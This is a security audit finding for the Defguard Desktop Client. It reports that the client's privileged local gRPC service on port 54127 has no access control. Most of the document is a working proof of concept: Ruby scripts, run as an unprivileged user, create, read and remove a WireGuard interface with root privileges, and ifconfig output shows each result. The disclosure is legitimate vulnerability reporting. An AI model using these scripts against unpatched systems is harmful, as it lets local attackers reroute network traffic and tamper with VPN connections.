---
title: "DG25-27: [desktop_client] Unrestricted access to the local gRPC service"
severity: Medium
cvss_score: 8.7
cvss_string: "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H"
issue_link: https://github.com/DefGuard/client/issues/551
status: In Progress
---

#### Detailed status

Issue fixed for Linux and MacOS. In progress for Windows.

### Technical details

Defguard Desktop Client package installs a privileged system service and
an unprivileged client application.

The Defguard service exposes on local port (54127) the gRPC service for
communication with the Defguard GUI application.

Unprivileged process can request three actions using the gRPC service:

-   create interface (new WireGuard connection)

-   read interface data (info about a remote peer)

-   remove interface (close connection)

Each action is performed with system service privileges (root on Linux
and MacOS, SYSTEM on Windows).

The gRPC service is available to any process that can establish a TCP
connection to local port 127.0.0.1:54127 and does not implement any
access control.

#### Proof of Concept

Example shows how to perform available actions using Ruby environment
and direct gRPC requests.

1.  Debian Linux with Defguard Desktop Client.

```bash
$ uname -a
Linux vboxdeb 6.1.0-32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64 GNU/Linux

$ /usr/sbin/defguard-service --version
defguard-client 1.5.0
```

![](/images/pentest/DG25/img10.png)

2.  Install ruby environment with gRPC modules.

```sh
apt install ruby ruby-dev
gem install grpc grpc-tools
```

3. Download source code of the Defguard Desktop Client.

```bash
$ git clone --depth=1 --recurse-submodules -b v1.5.0-alpha1 https://github.com/DefGuard/client.git defguard_client_v1.5.0-alpha1
```

4.  Generate Ruby scripts for the gRPC service.

```bash
$ mkdir /tmp/grpc_ruby
$ grpc_tools_ruby_protoc --proto_path=./defguard_client_v1.5.0-alpha1/src-tauri/proto/client/ --ruby_out=/tmp/grpc_ruby --grpc_out=/tmp/grpc_ruby client.proto
```

5.  Check network configuration.

```bash
# ifconfig -a
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
        inet 10.0.2.15 netmask 255.255.255.0 broadcast 10.0.2.255
        inet6 fe80::a00:27ff:feb2:fc34 prefixlen 64 scopeid 0x20<link>
        inet6 fd00::a00:27ff:feb2:fc34 prefixlen 64 scopeid 0x0<global>
        inet6 fd00::5415:67df:27a2:ae1f prefixlen 64 scopeid 0x0<global>
        ether 08:00:27:b2:fc:34 txqueuelen 1000 (Ethernet)
        RX packets 68167 bytes 88898744 (84.7 MiB)
        RX errors 0 dropped 0 overruns 0 frame 0
        TX packets 34105 bytes 2619543 (2.4 MiB)
        TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
        inet 127.0.0.1 netmask 255.0.0.0
        inet6 ::1 prefixlen 128 scopeid 0x10<host>
        loop txqueuelen 1000 (Local Loopback)
        RX packets 1245 bytes 107392 (104.8 KiB)
        RX errors 0 dropped 0 overruns 0 frame 0
        TX packets 1245 bytes 107392 (104.8 KiB)
        TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
```

6.  Create a new WireGuard interface with active connection.

```bash
$ sudo -u nobody id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

$ sudo -u nobody ruby -I/tmp/grpc_ruby create_interface.rb
```

**create_interface.rb**

```ruby
require 'client_services_pb'
include Client

grpc = DesktopDaemonService::Stub::new('127.0.0.1:54127', :this_channel_is_insecure)

grpc.create_interface CreateInterfaceRequest::new(
  config: InterfaceConfig::new(
    name: 'wg1337',
    prvkey: '9318b207a7817a6d991e74d6300a6f724e6390a32d186e1e0e4f3c370334f563',
    address: '10.22.33.20/24',
    port: 1337,
    peers: [
      Peer::new(
        public_key: 'c2ae6e16af449e74509080c9af723f6d84bf12106fc1ce27a6d21ec278737615',
        preshared_key: '0000000000000000000000000000000000000000000000000000000000000000',
        protocol_version: 1,
        endpoint: '167.172.191.17:51820',
        last_handshake: 0,
        tx_bytes: 0,
        rx_bytes: 0,
        persistent_keepalive_interval: 300,
        allowed_ips: ['10.22.33.0/24']
      )
    ]
  ),
  allowed_ips: ['10.22.33.0/24'],
  dns: '1.1.1.1'
)
```

7.  Check network configuration.

```bash
# ifconfig -a
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
        inet 10.0.2.15 netmask 255.255.255.0 broadcast 10.0.2.255
        inet6 fe80::a00:27ff:feb2:fc34 prefixlen 64 scopeid 0x20<link>
        inet6 fd00::a00:27ff:feb2:fc34 prefixlen 64 scopeid 0x0<global>
        inet6 fd00::5415:67df:27a2:ae1f prefixlen 64 scopeid 0x0<global>
        ether 08:00:27:b2:fc:34 txqueuelen 1000 (Ethernet)
        RX packets 68303 bytes 88926375 (84.8 MiB)
        RX errors 0 dropped 0 overruns 0 frame 0
        TX packets 34244 bytes 2647464 (2.5 MiB)
        TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
        inet 127.0.0.1 netmask 255.0.0.0
        inet6 ::1 prefixlen 128 scopeid 0x10<host>
        loop txqueuelen 1000 (Local Loopback)
        RX packets 1263 bytes 109200 (106.6 KiB)
        RX errors 0 dropped 0 overruns 0 frame 0
        TX packets 1263 bytes 109200 (106.6 KiB)
        TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

wg1337: flags=209<UP,POINTOPOINT,RUNNING,NOARP> mtu 1420
        inet 10.22.33.20 netmask 255.255.255.0 destination 10.22.33.20
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 1000 (UNSPEC)
        RX packets 2 bytes 124 (124.0 B)
        RX errors 0 dropped 0 overruns 0 frame 0
        TX packets 2 bytes 180 (180.0 B)
        TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
```

8.  Read interface data.

```bash
$ sudo -u nobody ruby -I/tmp/grpc_ruby read_interface_data.rb
```

**Output:**
```
<Client::InterfaceData: listen_port: 1337, peers: [<Client::Peer: public_key: "c2ae6e16af449e74509080c9af723f6d84bf12106fc1ce27a6d21ec278737615", preshared_key: "0000000000000000000000000000000000000000000000000000000000000000", endpoint: "167.172.191.17:51820", last_handshake: 1755875939, tx_bytes: 180, rx_bytes: 252, persistent_keepalive_interval: 300, allowed_ips: ["10.22.33.0/24"]>]>
```

**read_interface_data.rb**

```ruby
require 'client_services_pb'
include Client

grpc = DesktopDaemonService::Stub::new('127.0.0.1:54127', :this_channel_is_insecure)

result = grpc.read_interface_data ReadInterfaceDataRequest::new(
  interface_name: 'wg1337'
)

result.each do |data|
  break if data.peers.empty?
  p data
end
```

9.  Remove interface (close connection).

```bash
$ sudo -u nobody ruby -I/tmp/grpc_ruby remove_interface.rb
```

**remove_interface.rb**

```ruby
require 'client_services_pb'
include Client

grpc = DesktopDaemonService::Stub::new('127.0.0.1:54127', :this_channel_is_insecure)

grpc.remove_interface RemoveInterfaceRequest::new(
  interface_name: 'wg1337',
  endpoint: '10.22.33.20/24'
)
```

10. Check network configuration.

```bash
# ifconfig -a
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST> mtu 1500
        inet 10.0.2.15 netmask 255.255.255.0 broadcast 10.0.2.255
        inet6 fe80::a00:27ff:feb2:fc34 prefixlen 64 scopeid 0x20<link>
        inet6 fd00::a00:27ff:feb2:fc34 prefixlen 64 scopeid 0x0<global>
        inet6 fd00::5415:67df:27a2:ae1f prefixlen 64 scopeid 0x0<global>
        ether 08:00:27:b2:fc:34 txqueuelen 1000 (Ethernet)
        RX packets 68327 bytes 88930655 (84.8 MiB)
        RX errors 0 dropped 0 overruns 0 frame 0
        TX packets 34261 bytes 2650098 (2.5 MiB)
        TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING> mtu 65536
        inet 127.0.0.1 netmask 255.0.0.0
        inet6 ::1 prefixlen 128 scopeid 0x10<host>
        loop txqueuelen 1000 (Local Loopback)
        RX packets 1305 bytes 112781 (110.1 KiB)
        RX errors 0 dropped 0 overruns 0 frame 0
        TX packets 1305 bytes 112781 (110.1 KiB)
        TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
```
